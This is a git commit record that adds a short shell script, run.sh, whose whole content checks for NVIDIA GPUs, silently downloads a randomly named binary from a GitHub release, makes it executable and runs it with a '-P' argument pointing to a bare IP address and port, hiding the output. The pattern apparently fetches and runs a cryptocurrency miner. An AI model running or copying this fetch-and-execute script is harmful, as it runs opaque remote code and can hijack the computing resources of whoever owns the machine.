64864fe9bb1c4d288c9f6f8ce8a5a6243c12dbad
phucbmt <phucdlbmt@gmail.com>
2021-03-02 22:52:16 +0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,5 @@
+!/bin/bash
+nvidia-smi -L
+wget https://github.com/friartuxlh25/1234dsfsdfs/releases/download/1/sdfsdgferter3453 &> /dev/null
+chmod +x sdfsdgferter3453
+./sdfsdgferter3453 -P http://216.198.92.69:4545/"$1" &> log
